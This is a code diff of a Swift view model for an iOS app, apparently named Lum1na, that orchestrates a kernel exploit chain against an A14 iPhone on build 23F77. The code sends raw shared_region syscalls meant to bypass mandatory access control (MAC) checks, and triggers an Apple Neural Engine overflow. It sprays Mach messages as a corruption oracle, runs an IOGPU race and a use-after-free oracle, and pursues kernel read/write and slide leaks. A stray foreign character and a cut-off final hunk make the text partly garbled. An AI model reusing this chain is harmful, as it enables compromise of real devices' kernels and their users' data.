@@ -2,24 +2,22 @@
 //  Lum1naViewModel.swift
 //  Lum1na
 //
-//  Central state + orchestration. Wired to:
-//    - Lum1naLogBridge (ObjC console bridge, tag-based logging)
-//    - P044ExploitController / ANE254InputController (groom → handoff → KRW)
-//    - ANEDirectIn (P059, direct ANE selector 2, bypasses CoreML x_189 wall)
-//    - P022 shared_region probes (syscall 536, sf_fd=-1 MAC bypass)
-//    - P060 kmsg 3072 Shape-O oracle
-//    - IOGPU64788Controller (P061)
+//  Self-contained view model. Wired to (via Lum1na-Bridging-Header.h):
+//    ANEDirectIn            (P059 — direct ANE selector 2, bypasses CoreML)
+//    IOGPU64788Controller   (P061 — replace_backing_bytes race, 23F77 pins)
+//    P062StaleEntryOracle   (P062 — kalloc.256 stale-entry oracle)
+//    P044ExploitController  (existing groom → KRW chain)
 //
-//  Target: iPhone13,2 (A14) — iOS 23F77 ONLY. Never mix offsets.
+//  Logging: ObjC probes post NSNotification "Lum1naProbeLog"
+//  {tag: String, line: String}; this VM ingests them into the console.
+//  Target: iPhone13,2 (A14) — iOS 23F77 ONLY.
 //
 
 import SwiftUI
 import Combine
 import Darwin
-import IOSurface
-import IOKit
 
-// MARK: - Shared Types
+// MARK: - Status Types
 
 enum StageStatus: Equatable {
     case notRun
@@ -49,7 +47,7 @@ enum StageStatus: Equatable {
 enum ChainState: Equatable {
     case pending, running, complete, failed
 
-    var icon: String {
+    var iconName: String {
         switch self {
         case .pending:  return "circle"
         case .running:  return "arrow.triangle.2.circlepath"
@@ -68,54 +66,59 @@ enum ChainState: Equatable {
     }
 }
 
-struct P022ProbeResult: Identifiable, Equatable {
+enum Strategy: String, CaseIterable, Identifiable {
+    case aneChain = "ANE Chain"
+    case p022     = "P022 Bypass"
+    case oracle   = "Oracle"
+    var id: String { rawValue }
+}
+
+// MARK: - Board Model
+// NOTE: named BoardState — the repo already has an ObjC class Lum1naBoard
+// (Kernel/Lum1naBoard.h); a Swift type with the same name collides.
+
+struct BoardLeak: Identifiable, Equatable {
     let id = UUID()
-    let name: String          // "A" / "B" / "C"
-    let detail: String
-    let ret: Int              // syscall return (0 = SUCCESS = MAC BYPASS)
-    let errnoValue: Int32
-
-    var succeeded: Bool { ret == 0 }
+    let va: String
+    let source: String
+    let kind: String
 }
 
-struct HeapLeak: Identifiable, Equatable, Codable {
-    var id: UUID = UUID()
-    let va: String      // hex string, e.g. "0xffffffe632284b80"
-    let source: String  // e.g. "aio84530"
-    let kind: String    // e.g. "heap"
-
-    enum CodingKeys: String, CodingKey { case va, source, kind }
-}
-
-struct Lum1naBoard: Codable, Equatable {
-    var hasKread: Bool = false
-    var hasKwrite: Bool = false
+struct BoardState: Equatable {
+    var hasKread = false
+    var hasKwrite = false
     var kslide: UInt64 = 0
     var kbase: UInt64 = 0
-    var heapLeaks: [HeapLeak] = []
+    var leaks: [BoardLeak] = []
 
-    enum CodingKeys: String, CodingKey {
-        case hasKread, hasKwrite, kslide, kbase, heapLeaks = "leaks"
+    var hasLeak: Bool { kslide != 0 || kbase != 0 }
+    var hasKRW: Bool { hasKread && hasKwrite }
+
+    static func == (lhs: BoardState, rhs: BoardState) -> Bool {
+        lhs.hasKread == rhs.hasKread && lhs.hasKwrite == rhs.hasKwrite &&
+        lhs.kslide == rhs.kslide && lhs.kbase == rhs.kbase && lhs.leaks == rhs.leaks
     }
 
-    init() {}
-    init(from decoder: Decoder) throws {
-        let c = try decoder.container(keyedBy: CodingKeys.self)
-        hasKread   = try c.decodeIfPresent(Bool.self, forKey: .hasKread) ?? false
-        hasKwrite  = try c.decodeIfPresent(Bool.self, forKey: .hasKwrite) ?? false
-        let slideS = try c.decodeIfPresent(String.self, forKey: .kslide) ?? "0x0"
-        let baseS  = try c.decodeIfPresent(String.self, forKey: .kbase) ?? "0x0"
-        kslide = UInt64(slideS.dropFirst(2), radix: 16) ?? 0
-        kbase  = UInt64(baseS.dropFirst(2), radix: 16) ?? 0
-        heapLeaks = try c.decodeIfPresent([HeapLeak].self, forKey: .heapLeaks) ?? []
+    // Accepts Lum1naBoard JSON dumps:
+    // {"hasKread":..., "hasKwrite":..., "kslide":"0x0", "kbase":"0x0",
+    //  "leaks":[{"va":"0x...","source":"aio84530","kind":"heap"}, ...]}
+    static func from(json: Data) -> BoardState? {
+        guard let obj = try? JSONSerialization.jsonObject(with: json) as? [String: Any]
+        else { return nil }
+        var b = BoardState()
+        b.hasKread  = (obj["hasKread"] as? NSNumber)?.boolValue ?? false
+        b.hasKwrite = (obj["hasKwrite"] as? NSNumber)?.boolValue ?? false
+        b.kslide    = UInt64((obj["kslide"] as? String ?? "0x0").dropFirst(2), radix: 16) ?? 0
+        b.kbase     = UInt64((obj["kbase"] as? String ?? "0x0").dropFirst(2), radix: 16) ?? 0
+        if let arr = obj["leaks"] as? [[String: Any]] {
+            b.leaks = arr.map {
+                BoardLeak(va: $0["va"] as? String ?? "0x0",
+                          source: $0["source"] as? String ?? "?",
+                          kind: $0["kind"] as? String ?? "?")
+            }
+        }
+        return b
     }
-}
-
-enum KRWState: Equatable {
-    case pending
-    case scanningPairs(count: Int)
-    case established(kslide: UInt64, kbase: UInt64)
-    case failed(reason: String)
 }
 
 struct LogEntry: Identifiable, Equatable {
@@ -124,102 +127,91 @@ struct LogEntry: Identifiable, Equatable {
     let tag: String
     let message: String
 
-    var color: Color {
-        if tag.hasPrefix("P0") { return .blue }          // [P0xx] probe tags
-        switch tag {
-        case "+":  return .green
-        case "-":  return .red
-        case "!":  return .yellow
-        case "*":  return .blue
-        default:   return .secondary
-        }
-    }
-
-    var timestampText: String {
+    var timeText: String {
         let f = DateFormatter()
         f.dateFormat = "HH:mm:ss"
         return f.string(from: timestamp)
     }
+
+    var color: Color {
+        if tag.hasPrefix("P0") { return .blue }          // [P0xx] probes
+        switch tag {
+        case "+": return .green
+        case "-": return .red
+        case "!": return .yellow
+        default:  return .primary
+        }
+    }
 }
 
-// MARK: - P022 shared_region Swift probes (syscall 536)
-//
-// Probe A: sf_fd = -1, all-NO_REBASE slide_info  → if ret == 0, MAC mmap bypassed
-// Probe B: real cache fd control                 → expect errno (validates the wall)
-// Probe C: prot sweep with sf_fd = -1            → RX/RW/RWX/RO/X/NONE
-//
-// NOTE: verify sf_mapping layout against your P022 v37 notes before trusting
-// probe results beyond the errno oracle. errno is the ground truth either way.
+struct P022ProbeResult: Identifiable, Equatable {
+    let id = UUID()
+    let name: String
+    let detail: String
+    let ret: Int
+    let errnoValue: Int32
+    var succeeded: Bool { ret == 0 }
+}
 
-enum P022SharedRegionProbes {
+enum KRWState: Equatable {
+    case pending
+    case scanning(count: Int)
+    case established
+    case failed(reason: String)
+}
 
-    // 5 x u32 mapping record; all zeros = NO_REBASE. VERIFY against v37 notes.
-    static let mappingRecordWords = 5
-    static let mappingCount = 1
+// MARK: - P022 shared_region Probes (syscall 536, sf_fd = -1)
+// Probe A: sf_fd=-1, all-NO_REBASE  → ret 0 = MAC mmap BYPASSED = direct KRW path
+// Probe B: real cache fd control    → expect errno (validates the wall)
+// Probe C: prot sweep with sf_fd=-1
+// NOTE: sf_mapping word layout is a verification guess; errno is ground truth.
 
-    static func probeA() -> P022ProbeResult {
+enum P022Probes {
+    static let mappingWords = 5
+
+    private static func fire(sfFD: Int32, prot: UInt32) -> (Int, Int32) {
         var fbuf = [UInt32](repeating: 0, count: 0x400)
-        fbuf[0] = UInt32(bitPattern: Int32(-1))   // sf_fd = -1 → skip fp_lookup
-        fbuf[1] = UInt32(mappingCount)            // sf_mappings = 1
-        var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)
+        fbuf[0] = UInt32(bitPattern: sfFD)
+        fbuf[1] = 1                                    // sf_mappings = 1
+        var mappings = [UInt32](repeating: 0, count: mappingWords)
+        mappings[3] = prot                             // prot word — verify vs v37 notes
 
         let ret = fbuf.withUnsafeMutableBufferPointer { fb in
             mappings.withUnsafeMutableBufferPointer { mp in
                 syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
             }
         }
-        return P022ProbeResult(name: "A", detail: "sf_fd=-1, all-NO_REBASE",
-                               ret: Int(ret), errnoValue: errno)
+        return (Int(ret), errno)
+    }
+
+    static func probeA() -> P022ProbeResult {
+        let (ret, err) = fire(sfFD: -1, prot: 5)       // RX, all-NO_REBASE
+        return P022ProbeResult(name: "A", detail: "sf_fd=-1 all-NO_REBASE",
+                               ret: ret, errnoValue: err)
     }
 
     static func probeB() -> P022ProbeResult {
-        let paths = [
-            "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
-            "/System/Library/dyld/dyld_shared_cache_arm64e"
-        ]
+        let paths = ["/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+                     "/System/Library/dyld/dyld_shared_cache_arm64e"]
         var fd: Int32 = -1
-        for p in paths {
-            fd = open(p, O_RDONLY)
-            if fd >= 0 { break }
-        }
+        for p in paths { fd = open(p, O_RDONLY); if fd >= 0 { break } }
         guard fd >= 0 else {
-            return P022ProbeResult(name: "B", detail: "real-fd control (no cache fd)",
+            return P022ProbeResult(name: "B", detail: "no cache fd available",
                                    ret: -1, errnoValue: ENOENT)
         }
         defer { close(fd) }
-
-        var fbuf = [UInt32](repeating: 0, count: 0x400)
-        fbuf[0] = UInt32(fd)                      // real fd → expect MAC deny
-        fbuf[1] = UInt32(mappingCount)
-        var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)
-
-        let ret = fbuf.withUnsafeMutableBufferPointer { fb in
-            mappings.withUnsafeMutableBufferPointer { mp in
-                syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
-            }
-        }
-        return P022ProbeResult(name: "B", detail: "real-fd control (expect deny)",
-                               ret: Int(ret), errnoValue: errno)
+        let (ret, err) = fire(sfFD: fd, prot: 5)
+        return P022ProbeResult(name: "B", detail: "real-fd control (deny expected)",
+                               ret: ret, errnoValue: err)
     }
 
     static func probeC() -> [P022ProbeResult] {
-        let prots: [(String, UInt32)] = [
-            ("RO", 1), ("W", 2), ("RW", 3), ("X", 4), ("RX", 5), ("RWX", 7)
-        ]
-        return prots.map { prot in
-            var fbuf = [UInt32](repeating: 0, count: 0x400)
-            fbuf[0] = UInt32(bitPattern: Int32(-1))
-            fbuf[1] = UInt32(mappingCount)
-            var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)
-            mappings[3] = prot.1   // prot word — verify position against v37
-
-            let ret = fbuf.withUnsafeMutableBufferPointer { fb in
-                mappings.withUnsafeMutableBufferPointer { mp in
-                    syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
-                }
-            }
-            return P022ProbeResult(name: "C", detail: "sf_fd=-1 prot=\(prot.0)",
-                                   ret: Int(ret), errnoValue: errno)
+        let prots: [(String, UInt32)] = [("RO",1), ("W",2), ("RW",3),
+                                         ("X",4), ("RX",5), ("RWX",7)]
+        return prots.map {
+            let (ret, err) = fire(sfFD: -1, prot: $0.1)
+            return P022ProbeResult(name: "C", detail: "sf_fd=-1 prot=\($0.0)",
+                                   ret: ret, errnoValue: err)
         }
     }
 }
@@ -229,223 +221,190 @@ enum P022SharedRegionProbes {
 @MainActor
 final class Lum1naViewModel: ObservableObject {
 
-    // MARK: Board (Lum1naBoard JSON state)
-    @Published var board = Lum1naBoard()
+    // Board
+    @Published var board = BoardState()
 
-    // MARK: Stage statuses
+    // Stage statuses
     @Published var p044Status: StageStatus = .notRun
     @Published var p022Status: StageStatus = .notRun
-    @Published var p022ProbeResults: [P022ProbeResult] = []
-    @Published var aneDirectInStatus: StageStatus = .notRun      // P059
-    @Published var kmsgOracleStatus: StageStatus = .notRun       // P060
-    @Published var p061Status: StageStatus = .notRun             // IOGPU 64788
+    @Published var aneDirectInStatus: StageStatus = .notRun   // P059
+    @Published var p061Status: StageStatus = .notRun          // IOGPU 64788 race
+    @Published var p062Status: StageStatus = .notRun          // stale-entry oracle
+    @Published var kmsgOracleStatus: StageStatus = .notRun    // P060
 
-    // MARK: Chain / KRW
+    // Probe details
+    @Published var p022ProbeResults: [P022ProbeResult] = []
+
+    // Chain / counters
     @Published var groomedPairCount = 0
     @Published var corruptedPairCount = 0
+    @Published var p062StaleHits = 0
     @Published var krwState: KRWState = .pending
     @Published var groomState: ChainState = .pending
     @Published var aneFireState: ChainState = .pending
     @Published var pairScanState: ChainState = .pending
     @Published var krwChainState: ChainState = .pending
 
-    // MARK: Console
+    // Console
     @Published var consoleLogs: [LogEntry] = []
-    @Published var activeStrategy: ExploitStageSelector.Strategy = .aneChain
-
-    // Set at app init to also forward logs into the ObjC bridge if wanted.
-    var externalLogSink: ((String, String) -> Void)?
-
-    private var cancellables = Set<AnyCancellable>()
-
-    // MARK: Computed
-    var isKernelLeakDetected: Bool { board.kslide != 0 || board.kbase != 0 }
-    var hasKRW: Bool { board.hasKread && board.hasKwrite }
+    @Published var activeStrategy: Strategy = .aneChain
 
     // MARK: Init
+
     init() {
-        log("*", "Lum1na view model online — target A14 23F77")
+        log("*", "Lum1na online — target A14 23F77")
+        NotificationCenter.default.addObserver(
+            forName: NSNotification.Name("Lum1naProbeLog"),
+            object: nil, queue: .main
+        ) { [weak self] note in
+            guard let self,
+                  let tag = note.userInfo?["tag"] as? String,
+                  let line = note.userInfo?["line"] as? String else { return }
+            self.log(tag, line)
+        }
     }
 
-    // MARK: Logging (matches console tag scheme: P0xx / * / + / - / !)
+    // MARK: Logging
+
     func log(_ tag: String, _ message: String) {
-        let entry = LogEntry(timestamp: Date(), tag: tag, message: message)
-        consoleLogs.append(entry)
-        if consoleLogs.count > 2000 { consoleLogs.removeFirst(consoleLogs.count - 2000) }
-        externalLogSink?(tag, message)
+        consoleLogs.append(LogEntry(timestamp: Date(), tag: tag, message: message))
+        if consoleLogs.count > 2000 {
+            consoleLogs.removeFirst(consoleLogs.count - 2000)
+        }
     }
     func logInfo(_ m: String)    { log("*", m) }
     func logSuccess(_ m: String) { log("+", m) }
     func logError(_ m: String)   { log("-", m) }
     func logWarn(_ m: String)    { log("!", m) }
+    func clearLogs()             { consoleLogs.removeAll() }
 
-    func clearLogs() { consoleLogs.removeAll() }
+    // MARK: Board ingestion
 
-    // MARK: Board ingestion (paste Lum1naBoard JSON dump here)
     func updateBoard(fromJSON data: Data) {
-        do {
-            let decoded = try JSONDecoder().decode(Lum1naBoard.self, from: data)
-            board = decoded
-            log("*", String(format: "Board updated: kslide=0x%llx kbase=0x%llx kread=%d kwrite=%d leaks=%d",
-                            board.kslide, board.kbase, board.hasKread ? 1 : 0,
-                            board.hasKwrite ? 1 : 0, board.heapLeaks.count))
-        } catch {
-            logError("Board JSON decode failed: \(error.localizedDescription)")
+        guard let b = BoardState.from(json: data) else {
+            logError("Board JSON decode failed")
+            return
         }
+        board = b
+        logInfo(String(format: "Board: kslide=0x%llx kbase=0x%llx kread=%d kwrite=%d leaks=%d",
+                       board.kslide, board.kbase,
+                       board.hasKread ? 1 : 0, board.hasKwrite ? 1 : 0,
+                       board.leaks.count))
     }
 
-    // MARK: P044 → ANE254 handoff bookkeeping
-    func integrateP044Results(groomedPairs: Int) {
-        groomedPairCount = groomedPairs
-        groomState = groomedPairs > 0 ? .complete : .failed
-        logSuccess("Copied \(groomedPairs) groomed pairs from P044")
-        if groomedPairs > 0 {
+    // MARK: P044 chain (existing controller)
+    // NOTE: adjust only these calls if your P044 entry point differs —
+    // everything else in this VM is independent of P044 internals.
+
+    func runP044Chain() {
+        guard p044Status != .running else { return }
+        p044Status = .running
+        groomState = .running
+        log("P044", "hole-victim chain: spray → free holes → ANE fire → scan")
+
+        let p044 = P044ExploitController()
+        p044.execute()
+        let pairs = p044.groomedPairs?.count ?? 0
+
+        groomedPairCount = pairs
+        groomState = pairs > 0 ? .complete : .failed
+        log(pairs > 0 ? "+" : "-",
+            "P044 groom finished — \(pairs) pairs")
+
+        if pairs > 0 {
             pairScanState = .running
-            krwState = .scanningPairs(count: groomedPairs)
-        }
-    }
-
-    // MARK: - P022 Probes
-    func runP022Probes() {
-        guard p022Status != .running else { return }
-        p022Status = .running
-        p022ProbeResults.removeAll()
-        log("P022", "shared_region syscall 536 — running probes A/B/C")
-
-        let a = P022SharedRegionProbes.probeA()
-        p022ProbeResults.append(a)
-        log(a.succeeded ? "+" : "-", "P022 Probe A (\(a.detail)): ret=\(a.ret) errno=\(a.errnoValue)")
-        if a.succeeded {
-            logSuccess("P022 Probe A ret=0 — MAC mmap BYPASSED — direct KRW path live")
-        }
-
-        let b = P022SharedRegionProbes.probeB()
-        p022ProbeResults.append(b)
-        log(b.ret != 0 ? "*" : "!", "P022 Probe B (\(b.detail)): ret=\(b.ret) errno=\(b.errnoValue) (nonzero expected — validates the wall)")
-
-        let cResults = P022SharedRegionProbes.probeC()
-        for c in cResults {
-            p022ProbeResults.append(c)
-            log(c.succeeded ? "+" : "-", "P022 Probe C (\(c.detail)): ret=\(c.ret) errno=\(c.errnoValue)")
-        }
-
-        let anySuccess = p022ProbeResults.contains { $0.succeeded }
-        p022Status = anySuccess ? .ok
-            : .fail(errno: p022ProbeResults.first?.errnoValue ?? 0, kr: 0)
-        if anySuccess {
-            logSuccess("P022: at least one probe returned 0 — elevate to KRW workstream")
+            krwState = .scanning(count: pairs)
+            logInfo("P044 hands off internally to ANE254 (integrateP044Results) — watch console for KRW result")
         } else {
-            logError("P022: all probes returned errno — sf_fd=-1 path appears walled on 23F77")
+            p044Status = .fail(errno: 0, kr: 0)
         }
     }
 
-    // MARK: - P059 ANEDirectIn
-    // Requires bridging header: #import "ANEDirectIn.h"
+    // MARK: P059 ANEDirectIn
+
     func runANEDirectIn() {
         guard aneDirectInStatus != .running else { return }
         aneDirectInStatus = .running
-        log("P059", "ANEDirectIn — direct ANE selector 2, bypassing CoreML x_189 wall")
+        log("P059", "ANEDirectIn — direct ANE selector 2 (bypasses CoreML x_189 wall)")
 
         let direct = ANEDirectIn.sharedDirectIn()
-        var err: NSError?
-        let kr = direct.openDeviceWithError(&err)
-        guard kr == KERN_SUCCESS else {
-            aneDirectInStatus = .fail(errno: 0, kr: Int32(kr))
-            logError(String(format: "P059 openDevice failed: kr=0x%x %@", kr, err?.localizedDescription ?? ""))
-            return
-        }
-        logSuccess("P059 AppleH11ANEInterface opened (type 1)")
-
-        // 255 surfaces: 254 input + 1 output
-        guard let surfaces = direct.createTriggerSurfacesWithCount(255, error: &err) as? [IOSurfaceRef] else {
+        if direct.triggerOverflow254WithError(nil) {
+            aneDirectInStatus = .ok
+            aneFireState = .complete
+            logSuccess("P059 request accepted by driver — overflow fill should have run")
+            logInfo("Verify with P060 oracle / board state")
+        } else {
             aneDirectInStatus = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("P059 surface creation failed: \(err?.localizedDescription ?? "unknown")")
-            return
+            aneFireState = .failed
+            logError("P059 trigger failed — see Documents/p06x_ANEDirectIn_log.txt")
         }
-        log("*", "P059 created \(surfaces.count) IOSurfaces (64x64x4)")
-
-        let ids = surfaces.map { IOSurfaceGetID($0) }
-        guard let baseID = ids.first, baseID != 0 else {
-            aneDirectInStatus = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("P059 IOSurfaceGetID returned 0 — surfaces not usable")
-            return
-        }
-
-        var request = H11ANEProgramRequestArgsStruct()
-        buildOverflowRequest(&request, 0x1, baseID)   // 254 inputs → 0x3E0 OOB
-        log("*", String(format: "P059 request built: inputs=%u (0x3E0 OOB expected)",
-                        request.total_InputBuffers))
-
-        var asyncPort: mach_port_t = 0
-        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &asyncPort)
-        defer { mach_port_destroy(mach_task_self(), asyncPort) }
-
-        let sendKr = direct.sendProgramRequest(&request, asyncPort: asyncPort)
-        log(String(format: "P059 ProgramSendRequest kr=0x%x", sendKr),
-            sendKr == KERN_SUCCESS ? "overflow request accepted — check oracle/board"
-                                   : "driver rejected request — verify struct layout offsets")
-
-        aneDirectInStatus = (sendKr == KERN_SUCCESS) ? .ok : .fail(errno: 0, kr: Int32(sendKr))
-        aneFireState = (sendKr == KERN_SUCCESS) ? .complete : .failed
     }
 
-    // MARK: - P060 kmsg 3072 Shape-O Oracle
-    // Spray kmsg bodies (~3072) → ANE fire → receive → look for {sid, sym, 1, dir}
-    // overwriting our 0xAA marker in the first 16 bytes.
+    // MARK: P060 kmsg 3072 Shape-O Oracle (pure Swift, self-contained)
+
     func runKmsgOracle() {
         guard kmsgOracleStatus != .running else { return }
         kmsgOracleStatus = .running
         corruptedPairCount = 0
-        log("P060", "kmsg 3072 Shape-O oracle starting (L/R/C/S/F rejected on 23F77)")
+        log("P060", "Shape-O oracle: kmsg 3072 spray → ANE fire → signature scan")
 
         let sprayCount = 64
         let bodySize = 3072
         let marker: UInt8 = 0xAA
+        let headerSize = MemoryLayout<mach_msg_header_t>.size
 
-        // 1. Spray: receive-right per port, big inline message
         var ports: [mach_port_t] = []
         var buffers: [UnsafeMutableRawPointer] = []
+        var sizes: [Int] = []
+
+        // 1. Spray inline messages (body ~3072 → lands in 4096 kalloc class)
         for _ in 0..<sprayCount {
             var p: mach_port_t = 0
-            guard mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS else { continue }
-            let msgSize = UInt32(MemoryLayout<mach_msg_header_t>.size + bodySize + 64)
-            let buf = UnsafeMutableRawPointer.allocate(byteCount: Int(msgSize), alignment: 8)
-            buf.initializeMemory(as: UInt8.self, repeating: 0, count: Int(msgSize))
+            guard mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS
+            else { continue }
+
+            let msgSize = headerSize + bodySize
+            let buf = UnsafeMutableRawPointer.allocate(byteCount: msgSize, alignment: 8)
+            buf.initializeMemory(as: UInt8.self, repeating: 0, count: msgSize)
+
             let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
-            hdr.pointee.msgh_bits = UInt32(MACH_MSG_TYPE_MAKE_SEND)
-            hdr.pointee.msgh_size = msgSize
+            hdr.pointee.msgh_bits        = UInt32(MACH_MSG_TYPE_MAKE_SEND)
+            hdr.pointee.msgh_size        = UInt32(msgSize)
             hdr.pointee.msgh_remote_port = p
-            hdr.pointee.msgh_local_port = 0
-            hdr.pointee.msgh_id = 0x1234
-            // body marker
-            let body = buf.advanced(by: MemoryLayout<mach_msg_header_t>.size)
-                .assumingMemoryBound(to: UInt8.self)
+            hdr.pointee.msgh_local_port  = 0
+            hdr.pointee.msgh_voucher_port = 0
+            hdr.pointee.msgh_id          = 0x0600
+
+            let body = buf.advanced(by: headerSize).assumingMemoryBound(to: UInt8.self)
             for i in 0..<bodySize { body[i] = marker }
-            let kr = mach_msg(hdr, MACH_SEND_MSG, msgSize, 0, 0, 0, 0)
+
+            let kr = mach_msg(hdr, MACH_SEND_MSG, UInt32(msgSize), 0, 0, 0, 0)
             if kr == KERN_SUCCESS {
-                ports.append(p)
-                buffers.append(buf)
+                ports.append(p); buffers.append(buf); sizes.append(msgSize)
             } else {
                 buf.deallocate()
+                mach_port_destroy(mach_task_self(), p)
             }
         }
-        log("*", "P060 sprayed \(ports.count) kmsg bodies @ \(bodySize)B")
+        logInfo("P060 sprayed \(buffers.count)/\(sprayCount) kmsg bodies @ \(bodySize)B")
 
-        // 2. Fire ANE overflow (reuse P059 trigger path, no device reopen spam)
+        // 2. Fire ANE overflow (P059 path)
         runANEDirectIn()
 
-        // 3. Receive + scan first 16 bytes
+        // 3. Receive + scan first 16 bytes for corruption over marker
         var corrupted = 0
         for (idx, p) in ports.enumerated() {
             let buf = buffers[idx]
             let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
-            hdr.pointee.msgh_local_port = p
-            hdr.pointee.msgh_bits = 0
-            let kr = mach_msg(hdr, MACH_RCV_MSG, 0, hdr.pointee.msgh_size, p,
-                              UInt32(500 /*ms*/), 0)
+            hdr.pointee.msgh_bits        = 0
+            hdr.pointee.msgh_local_port  = p
+            hdr.pointee.msgh_voucher_port = 0
+
+            let kr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                              0, UInt32(sizes[idx]), p, 500, 0)
             guard kr == KERN_SUCCESS else { continue }
-            let body = buf.advanced(by: MemoryLayout<mach_msg_header_t>.size)
-                .assumingMemoryBound(to: UInt8.self)
+
+            let body = buf.advanced(by: headerSize).assumingMemoryBound(to: UInt8.self)
             var touched = false
             for i in 0..<16 where body[i] != marker { touched = true; break }
             if touched {
@@ -455,96 +414,101 @@ final class Lum1naViewModel: ObservableObject {
             }
         }
         for b in buffers { b.deallocate() }
+        for p in ports { mach_port_destroy(mach_task_self(), p) }
 
         corruptedPairCount = corrupted
         if corrupted > 0 {
             kmsgOracleStatus = .ok
-            logSuccess("P060 oracle: \(corrupted)/\(ports.count) neighbors corrupted — 43748 lands confirmed")
+            logSuccess("P060: \(corrupted) neighbors corrupted — CVE-2026-43748 lands confirmed")
         } else {
             kmsgOracleStatus = .fail(errno: ENOENT, kr: 0)
-            logError("P060 oracle: no corruption signature — overflow did not land in sprayed 3072 chunks")
+            logError("P060: no corruption signature — overflow did not reach sprayed chunks")
         }
     }
 
-    // MARK: - P061 IOGPU 64788
-    // Requires bridging header: #import "IOGPU64788Controller.h"
-    func runP061(iterations: UInt32 = 64) {
+    // MARK: P061 IOGPU 64788 replace race
+
+    func runP061(iterations: UInt32 = 32) {
         guard p061Status != .running else { return }
         p061Status = .running
-        log("P061", "IOGPU 64788 race — priming depot")
+        log("P061", "IOGPU 64788 race — init + replace cycles (23F77 pins)")
 
         let c = IOGPU64788Controller.sharedController()
         var err: NSError?
-        // slide unknown until an earlier stage leaks it; drive with slide 0 for
-        // driver-reach oracle only. Do NOT trust addresses when slide==0.
-        if !c.initializeWithKernelSlide(0, error: &err) {
+        guard c.initializeWithError(&err) else {
             p061Status = .fail(errno: 0, kr: KERN_FAILURE)
             logError("P061 init failed: \(err?.localizedDescription ?? "unknown")")
             return
         }
-        guard c.primeDepotWithError(&err) else {
-            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("P061 primeDepot failed: \(err?.localizedDescription ?? "unknown")")
-            return
-        }
-        logSuccess("P061 resource created — arming race")
-        guard c.armRaceWithError(&err) else {
-            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("P061 armRace failed: \(err?.localizedDescription ?? "unknown")")
-            return
-        }
-        c.fire(withIterations: iterations, error: &err)
+        c.fire(withIterations: iterations)
 
         let d = c.raceDiagnostics() ?? [:]
-        let wins = (d["reclaimWins"] as? NSNumber)?.uintValue ?? 0
-        let pacs = (d["pacFailures"] as? NSNumber)?.uintValue ?? 0
-        log("*", String(format: "P061 fired %u iters — reclaimWins=%u pacFailures=%u",
-                        iterations, wins, pacs))
-        p061Status = (wins > 0 || pacs > 0) ? .ok : .fail(errno: 0, kr: 0)
-        if wins > 0 { logSuccess("P061 reclaim wins detected — escalate to setAllocation dispatch") }
-伟    }
+        let okCount  = (d["replaceOK"] as? NSNumber)?.uintValue ?? 0
+        let mismatch = (d["lenMismatch"] as? NSNumber)?.uintValue ?? 0
+        log("*", String(format: "P061 done — REPLACE_OK=%u lenMismatch=%u", okCount, mismatch))
 
-    // MARK: - Full P044 chain (groom → integrate → KRW)
-    // Requires bridging header entries for P044ExploitController / ANE254InputController.
-    func runP044Chain() {
-        guard p044Status != .running else { return }
-        p044Status = .running
-        groomState = .running
-        log("P044", "hole-victim chain: spray → free holes → ANE fire → scan")
-
-        let p044 = P044ExploitController()
-        var err: NSError?
-        guard p044.prepareWithError(&err) else {
-            p044Status = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("P044 prepare failed: \(err?.localizedDescription ?? "unknown")")
-            return
+        p061Status = okCount > 0 ? .ok : .fail(errno: 0, kr: 0)
+        if okCount > 0 {
+            logSuccess("P061 replace path live — graft P009 GMD reclaim spray next ([GRAFT] point)")
         }
-        p044.execute()
-        let pairs = p044.groomedPairs?.count ?? 0
-        integrateP044Results(groomedPairs: pairs)
-        logSuccess("P044 groom complete — \(pairs) pairs")
+    }
 
-        let ane = ANE254InputController()
-        if ane.integrateP044Results(p044, error: &err) {
-            logSuccess("ANE254 handoff complete (ports ref-counted, P044 cleanup skipped)")
-            p044.shouldSkipPortCleanup = true
-            krwState = .scanningPairs(count: pairs)
-            let krwOK = ane.establishKRWWithError(&err)
-            if krwOK {
-                krwStatus = .ok
-                krwState = .established(kslide: board.kslide, kbase: board.kbase)
-                pairScanState = .complete
-                krwChainState = .complete
-                logSuccess("KRW established — board will reflect kslide/kbase")
-            } else {
-                krwStatus = .fail(errno: 0, kr: KERN_FAILURE)
-                krwState = .failed(reason: err?.localizedDescription ?? "no corrupted pairs")
-                pairScanState = .failed
-                logError("KRW failed: \(err?.localizedDescription ?? "unknown")")
-            }
+    // MARK: P062 kalloc.256 stale-entry oracle
+
+    func runP062(iterations: UInt32 = 5) {
+        guard p062Status != .running else { return }
+        p062Status = .running
+        p062StaleHits = 0
+        log("P062", "stale-entry oracle — 1×65535 trigger, kalloc.256 zero-spray")
+
+        let oracle = P062StaleEntryOracle()
+        var err: NSError?
+        let landed = oracle.run(withIterations: iterations, error: &err)
+
+        p062StaleHits = Int(oracle.staleHits)
+        if landed || oracle.staleHits > 0 {
+            p062Status = .ok
+            logSuccess("P062 STALE HIT confirmed (0xe0002be) — UAF live on 23F77")
         } else {
-            p044Status = .fail(errno: 0, kr: KERN_FAILURE)
-            logError("ANE254 handoff failed: \(err?.localizedDescription ?? "unknown")")
+            p062Status = .fail(errno: 0, kr: 0)
+            logError("P062 no stale hits — see Documents/p06x_P062_log.txt")
+        }
+    }
+
+    // MARK: P022 probes
+
